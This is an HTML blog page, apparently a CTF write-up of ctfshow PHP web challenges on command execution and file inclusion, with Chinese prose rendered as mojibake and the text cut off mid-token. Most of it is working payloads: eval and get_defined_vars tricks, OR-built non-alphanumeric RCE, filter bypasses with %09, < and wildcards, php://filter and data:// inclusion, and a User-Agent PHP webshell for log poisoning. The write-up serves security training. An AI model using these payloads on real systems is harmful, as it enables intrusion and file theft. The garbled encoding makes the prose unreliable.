<li>get_defined_vars() è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„å¤šç»´æ•°ç»„ã€‚è¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ï¼Œä¾‹å¦‚GETã€POSTã€FILEç­‰ç­‰ã€‚</li>
<li>next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</li>
<li>array_pop() å‡½æ•°åˆ é™¤æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ å¹¶è¿”å›å…¶å€¼ã€‚</li>
</ul>
<p>ä¼ å…¥ <code>/?c=print_r(get_defined_vars());</code> æ¥æ‰“å°æ‰€æœ‰å˜é‡<br>è¿™é‡Œæˆ‘ä»¬å†POSTä¸€ä¸ªa&#x3D;phpinfo();<br>é€šè¿‡  <code>next(get_defined_vars())</code> å¯ä»¥å¾—åˆ° <code>Array ( [a] =&gt; phpinfo(); ) </code><br>æ‹¿åˆ°è¿™ä¸ªæ•°ç»„å åˆ©ç”¨array_popå¯ä»¥å¼¹å‡ºæ•°ç»„ä¸­çš„å†…å®¹ ä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦çš„phpinfo();<br><code>array_pop(next(get_defined_vars()))</code><br>æ‰€ä»¥æ„é€ payload <code>/?c=eval(array_pop(next(get_defined_vars())));</code> å³å¯æ‰§è¡Œ<br>æ¥ä¸‹æ¥åªéœ€è¦æŠŠ POSTçš„å€¼æ”¹ä¸€æ”¹å°±èƒ½RCEäº†<br>æ³¨æ„POSTä¼ çš„å€¼ç»“å°¾è¦æœ‰åˆ†å·ï¼</p>
<h3 id="solution4"><a href="#solution4" class="headerlink" title="solution4"></a>solution4</h3><p><code>?c=eval(next(reset(get_defined_vars())));&amp;1=;system(&quot;tac%20flag.php&quot;);</code><br>è·Ÿè¯»å–postå‚æ•°ç±»ä¼¼ï¼Œç›´æ¥è¯»getå‚æ•°ç„¶ååˆ†ç¦»å‡ºæ¥æ‰§è¡Œ<br>è¿™é‡Œå®æµ‹å‘ç°å…¶å®æ˜¯å…ˆç”¨resetå°†ä¼ å…¥cä¹‹å‰çš„æ‰€æœ‰å˜é‡æ¸…ç©º å†ä¼ å…¥cä½œä¸ºç¬¬ä¸€ä¸ªå˜é‡ è€Œåä¼ å…¥çš„1å˜é‡æ˜¯ç¬¬äºŒä¸ª<br>é‚£ä¹ˆç”¨nextæŒ‡å‘ç¬¬äºŒä¸ª(ä¹Ÿå°±æ˜¯c1)å°±èƒ½æ‰§è¡Œäº†(print_ræ‰“å°å¯ä»¥å‘ç°ç›´æ¥å°±æ˜¯<code>system(&quot;tac flag.php&quot;);</code>å­—ç¬¦ä¸²æ‰€ä»¥ä¸éœ€è¦å–æ•°ç»„å…ƒç´ æ“ä½œ)</p>
<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„åˆ°è¿™é‡Œåé¢è·Ÿçš„æ˜¯ <code>/i</code> æ‰€ä»¥å¤§å°å†™å­—æ¯éƒ½è¢«è¿‡æ»¤äº†<br>è¿™â€¦ è²Œä¼¼æ˜¯æ— æ•°å­—å­—æ¯RCE ä»¥å‰æ²¡å­¦è¿‡ ç°åœ¨æ­£å¥½å­¦ä¸€å­¦<br>é¢˜ç›®ç»™äº†ä¸ª<a href="https://blog.csdn.net/miuzzx/article/details/108569080" target="_blank">hint</a><br>é‚£å°±è·Ÿç€å­¦ä¸€å­¦å§<br>é¢˜ç›®ç•™äº†ä¸ª or è¿ç®—ç¬¦ ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>%40 | %01</code> æ¥æ„é€ A(æäº¤åä¼šè‡ªåŠ¨urlè§£ç )<br>æ³¨æ„åˆ°æˆ‘ä»¬æ„é€ å‡ºæ¥çš„å­—ç¬¦ä¸²æ˜¯ä¸èƒ½ç›´æ¥æ‰§è¡Œçš„<br>åˆ©ç”¨phpç‰¹æ€§:<br>phpinfo();    &lt;&#x3D;&gt;   (â€˜phpinfoâ€™)();<br>ä¸‹é¢çœ‹çœ‹å¦‚ä½•æ„é€ system<br>å•ä¸ªå­—æ¯æ„é€  : <code>(&#39;%40&#39;|&#39;%13&#39;)</code> é‚£ä¹ˆå¤šä¸ªå­—æ¯å¦‚ä½•æ‹¼æ¥å‘¢? åˆ©ç”¨phpçš„ â€œ.â€ è¿ç®—ç¬¦å¯ä»¥å®ç°<br>æ‰€ä»¥ system(â€œlsâ€): <code>((&#39;%40&#39;|&#39;%13&#39;).(&#39;%40&#39;|&#39;%19&#39;).(&#39;%40&#39;|&#39;%13&#39;).(&#39;%40&#39;|&#39;%14&#39;).(&#39;%40&#39;|&#39;%05&#39;).(&#39;%60&#39;|&#39;%0d&#39;))(((&#39;%40&#39;|&#39;%0c&#39;).(&#39;%40&#39;|&#39;%13&#39;)))</code><br>ä½†æ˜¯è¿™æ ·è¿˜æ˜¯ä¸å¯æ‰§è¡Œ å› ä¸ºæˆ‘ä»¬æ„é€ çš„é‡Œé¢æœ‰ <code>%0d</code> è¿™ä¸ªæ˜¯æ¢è¡Œç¬¦â€¦<br>æ‰§è¡Œä¼šå‡ºç°</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">system</span><br><span class="line">(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure>
<p>è¿™ç§æƒ…å†µ<br>æ‰€ä»¥æœ€å¥½è¿˜æ˜¯è¦ç”¨é¢˜ç›®ç»™çš„ä¸¤ä¸ªè„šæœ¬æ¥è·‘ è¿‡å‡ å¤©å†æ¥çœ‹ (phpæœ¬åœ°ç¯å¢ƒæ²¡è£…)</p>
<hr>
<hr>
<p>æ€»ä¹‹è¿™é“é¢˜å±•ç¤ºäº†ä¸€ç§æŠ€å·§ åƒå…¶ä»–çš„æ¯”å¦‚ å–å xor æ¥æ„é€ éƒ½å¤§åŒå°å¼‚</p>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»æ²¡è§è¿‡çš„ä¸œè¥¿â€¦  orz<br>çœ‹è§†é¢‘çš„å¤§è‡´æ„æ€ å°±æ˜¯ä¸ç®¡æ€ä¹ˆæ‰§è¡Œ$cxxx æ‰€æœ‰è¿”å›ç»“æœéƒ½ä¸æ˜¾ç¤º<br>åˆå­¦åˆ°äº†ä¸€ä¸ªå§¿åŠ¿:<br>æ„é€ payload:  <code>/?c=ls;ls</code> è¿™æ ·å°±èƒ½å¾—åˆ°å›æ˜¾<br>å› ä¸ºæˆ‘ä»¬ç›¸å½“äºä¼ äº†ä¸¤æ¡å‘½ä»¤ åé¢çš„lsè¢«å†™å…¥é»‘æ´ä¸­äº† ä½†æ˜¯åˆ†å·å‰é¢çš„è¿™æ¡å‘½ä»¤ä¼šæ­£å¸¸æ‰§è¡Œ! orz<br>è¿™æ ·å°±å¯ä»¥ç›´æ¥RCEäº†</p>
<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åŠ äº†ä¸€å°ç‚¹è¿‡æ»¤ è¿‡æ»¤äº† \ åˆ†å· | cat<br>è¿‡æ»¤äº†åˆ†å·å°±ä¸èƒ½ç›´æ¥ç”¨ä¸Šé¢˜çš„æ–¹å¼äº†<br>å­¦ä¹ åˆ°äº† and: &amp;&amp; (ä¸Šä¸€é¢˜æˆ‘è¿˜è¯•è¿‡ åªæ˜¯å†™æˆå•&amp;äº†â€¦<del>G</del>)<br>&amp;&amp; è¿æ¥ä»£è¡¨ç¬¬ä¸€ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸåæ‰æ‰§è¡Œç¬¬äºŒä¸ª<br>ä½†æ˜¯ç›´æ¥ <code>ls&amp;&amp;ls</code> è¿˜æ˜¯æ²¡å›æ˜¾<br>çœ‹è§†é¢‘è¯´è¦å°† &amp; urlç¼–ç  %26 (ä¸ºä»€ä¹ˆå‘¢?)<br>å› ä¸ºæˆ‘ä»¬ç›´æ¥ä¼  <code>/?c=ls&amp;&amp;ls</code> ä¼šè¢«è§£ææˆæˆ‘ä¼ äº† c&#x3D;ls å’Œä¸€ä¸ª &amp;ls<br>æˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ç»“æ„å°±è¢«ç ´åæ‰äº† æ‰€ä»¥urlä¸Šç¼–ç éšè—ä¸€å±‚ æäº¤åè‡ªåŠ¨urlè§£ç å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤å½¢å¼äº†</p>
<p>å°è¯• || ä¸ç¼–ç å³å¯æ‰§è¡Œ</p>
<hr>
<hr>
<p>web orz</p>
<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><p>az<br>ä¸€æ ·çš„ç”¨ &amp;&amp;æ¥ç»•å°±è¡Œäº†<br><code>/?c=tac%20fla*.*||ls</code></p>
<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p>å¤šè¿‡æ»¤äº†ç©ºæ ¼<br>å°è¯•%20å‘ç°ä¹Ÿè¢«è¿‡æ»¤<br>ä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥ç”¨ %09(æ°´å¹³åˆ¶è¡¨ç¬¦)<br><code>/?c=tac%09fla*.*||ls</code></p>
<h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè™½ç„¶è¿‡æ»¤äº†0-9 ä½†æ˜¯æˆ‘ä»¬urlç¼–ç çš„%09è§£ç åä¸æ˜¯æ•°å­—<br>åœ¨æˆ‘ä»¬æäº¤å’Œæœ€åpreg_matchä¸­é—´ç»å†äº†ä¸€å±‚urlè§£ç <br><code>/?c=ta\c%09fla?.???||ls</code> å³å¯</p>
<h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿˜æ˜¯ç›´æ¥ <code>/?c=tac%09fla?.ph?||ls</code> å³å¯ç»•è¿‡</p>
<h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>emmm ä¸€æ ·çš„ç›´æ¥ç»• <code>/?c=tac%09fla?.ph?||ls</code><br>çœ‹é¢˜ç›®çš„hintå­¦åˆ°äº†å¦å¤–çš„æ€è·¯<br><code>nl&lt;fla&#39;&#39;g.php||</code></p>
<ul>
<li>nl: åˆ—å‡ºæ–‡ä»¶å†…å®¹ å¹¶åŠ ä¸Šè¡Œå·(ç©ºç™½ä¹ŸåŠ )</li>
<li>&lt;: è¿™é‡Œ&lt;&#x3D;&gt;%09</li>
<li>â€˜â€™: è¿™é‡Œå¯ç»•è¿‡ç©ºæ ¼(å®æµ‹åŒå¼•å·ä¹Ÿè¡Œ)</li>
</ul>
<p>è¿™é‡Œè‡ªå·±è¯•äº†è¯•å‘ç° <code>/?c=tac&lt;fla&#39;&#39;g.php||</code> æ˜¯å¯ä»¥ç»•è¿‡çš„  ä½†æ˜¯  <code>/?c=tac&lt;fla?.php||</code> å°±ä¸è¡Œäº†â€™(ä½†æˆ‘æœ¬åœ°Linuxåˆè¡Œâ€¦)</p>
<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><p>å¤šè¿‡æ»¤äº†ä¸ª %<br>å¯ä»¥ç”¨&lt;ä»£æ›¿%09<br><code>/?c=tac&lt;fla&#39;&#39;g.php||</code></p>
<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p>å¤šè¿‡æ»¤%09 %26<br>è¿˜æ˜¯ä¸€æ ·çš„payload<br><code>/?c=tac&lt;fla&#39;&#39;g.php||</code></p>
<h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p><code>/?file=pHp://FilTer/convert.base64-encode/resource=flag.php</code></p>
<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>å¤šåŠ äº†ä¸ªå¯¹phpçš„è¿‡æ»¤<br>æ¢dataåè®®è¯•è¯•<br>è·Ÿç€è§†é¢‘å­¦åˆ°äº†ä¸€ç§æ–¹æ³•<br><code>/?file=data://text/plain,&lt;?=eval($_POST[1]);?&gt;</code><br>è¿™é‡Œå› ä¸ºè¿‡æ»¤äº†php æ‰€ä»¥é‡‡ç”¨çŸ­æ ‡ç­¾ç»•è¿‡<br>ç„¶åPOSTä¸Šä¼  <code>1=system(&quot;tac flag.php&quot;);</code> æ³¨æ„åˆ†å·<br>å°±å¯ä»¥ç»•è¿‡äº†</p>
<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>åœ¨ä¸Šé¢˜çš„åŸºç¡€ä¸Šå¢åŠ äº† <code>str_replace(&quot;data&quot;, &quot;???&quot;, $file);</code><br>dataä¼ªåè®®ä¹Ÿä¸èƒ½ç”¨äº†<br>åˆå­¦åˆ°äº†ç¥å¥‡çš„ç»•è¿‡å§¿åŠ¿ orz<br>è§†é¢‘åˆ©ç”¨çš„æ˜¯æ—¥å¿—æ³¨å…¥æ¼æ´<br><code>User-Agent: &lt;?php eval($_POST[1]);?&gt;</code><br>ç„¶åä¼  <code>/?file=/var/log/nginx/access.log</code><br>å†POSTå³å¯<br>è¿™é‡Œæ”¹ä¸ºäº† fl0g.php<br>tql å¾…ä¼šå„¿çœ‹çœ‹æ—¥å¿—çŸ¥è¯†ç‚¹ orz</p>
<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>åœ¨ä¸Šé¢˜çš„åŸºç¡€ä¸Šå¢åŠ äº† <code>str_replace(&quot;:&quot;, &quot;???&quot;, $file);</code><br>ç”¨ä¸Šé¢˜çš„æ—¥å¿—æ³¨å…¥ä¸€æ ·å¯ä»¥ç»•è¿‡<br><code>/?file=/var/log/nginx/access.log</code><br>UA: <code>&lt;?=eval($_POST[1]);?&gt;</code><br>POST: <code>1=system(&quot;tac fl??.php&quot;);</code></p>
<h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè¿‡æ»¤äº†ç‚¹å·åå°±ä¸èƒ½åƒä¸Šä¸€é¢˜é‚£æ ·ç»•è¿‡äº†<br>è¿™é‡Œå®Œå…¨æ²¡æ€è·¯<br>è´´ä¸¤ä¸ªå­¦ä¹ é“¾æ¥<br><a href="https://www.freebuf.com/news/202819.html" target="_blank">here1</a><br><a href="https://xz.aliyun.com/t/10662" target="_blank">here2</a></p>
<h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ˜¯å¦‚ä½•ç»•è¿‡â€™æ­»äº¡exitâ€™çš„é—®é¢˜ <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a><br>å¯ä»¥ç”¨php:&#x2F;&#x2F;filterç¼–ç æ¥ç»•è¿‡<br>æ–‡ç« å†™äº†ä¸‰ç§æ€è·¯:</p>
<ul>
<li>base64ç¼–ç </li>
<li>strip_tags+base64 åŒè¿‡æ»¤å™¨</li>
<li>rot13</li>
</ul>
<p>è¿™é‡Œç®€å•ä¸€ç‚¹ç›´æ¥ç”¨rot13è½¬ä¸€ä¸‹ è®©å‰é¢çš„phpä»£ç ä¸æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">content=<span class="meta">&lt;?=</span> <span class="title function_ invoke__">flfgrz</span>(<span class="string">&quot;gnp sy*.*&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯¹file&#x3D;åé¢å†…å®¹äºŒæ¬¡urlç¼–ç  è¿™é‡Œè¦å…¨å­—ç¬¦ç¼–ç  å¯ä»¥ç”¨è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    clearFlag = <span class="string">&quot;y&quot;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> clearFlag == <span class="string">&quot;y&quot;</span> <span class="keyword">or</span> clearFlag == <span class="string">&quot;Y&quot;</span>:</span><br><span class="line">            os.system(<span class="string">&quot;cls&quot;</span>)</span><br><span class="line">        clearFlag = <span class="string">&quot;&quot;</span></span><br><span class="line">        string = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥éœ€è¦è½¬æ¢çš„å­—ç¬¦ä¸² :&quot;</span>)</span><br><span class="line">        <span class="built_in">type</span> = <span class="built_in">input</span>(<span class="string">&quot;è¯·é€‰æ‹©æ“ä½œç±»å‹(1ï¼šåŠ å¯† 2ï¼šè§£å¯†) :&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">type</span> != <span class="string">&quot;1&quot;</span> <span class="keyword">and</span> <span class="built_in">type</span> != <span class="string">&quot;2&quot;</span>):</span><br><span class="line">            <span class="built_in">type</span> = <span class="built_in">input</span>(<span class="string">&quot;æ“ä½œç±»å‹è¾“å…¥é”™è¯¯ï¼Œè¯·é‡æ–°é€‰æ‹©(1ï¼šåŠ å¯† 2ï¼šè§£å¯†) :&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;1&quot;</span> :</span><br><span class="line">            encode_string = encode(string)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ç¼–ç ç»“æœä¸ºï¼š&quot;</span>+encode_string+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;2&quot;</span> :</span><br><span class="line">            decode_string = decode(string)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;è§£ç ç»“æœä¸ºï¼š&quot;</span>+decode_string+<span class="string">&quot;ã€è¯·æ³¨æ„å‰åç©ºæ ¼ã€‘\n&quot;</span>)</span><br><span class="line">        clearFlag = <span class="built_in">input</span>(<span class="string">&quot;æŒ‰Y/yæ¸…ç©ºå±å¹•ç»§ç»­:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç¼–ç </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">string</span>):</span><br><span class="line">    encode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encode_char = <span class="built_in">hex</span>(<span class="built_in">ord</span>(char)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>)</span><br><span class="line">        encode_string += encode_char</span><br><span class="line">    <span class="keyword">return</span> encode_string</span><br><span class="line"></span><br><span class="line"><span class="comment">#è§£ç </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">string</span>):</span><br><span class="line">    decode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    string_arr = string.split(<span class="string">&quot;%&quot;</span>)</span><br><span class="line">    string_arr.pop(<span class="number">0</span>)           <span class="comment">#åˆ é™¤ç¬¬ä¸€ä¸ªç©ºå…ƒç´ </span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string_arr:</span><br><span class="line">        decode_char = <span class="built_in">chr</span>(<span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+char))</span><br><span class="line">        decode_string += decode_char</span><br><span class="line">    <span class="keyword">return</span> decode_string</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span 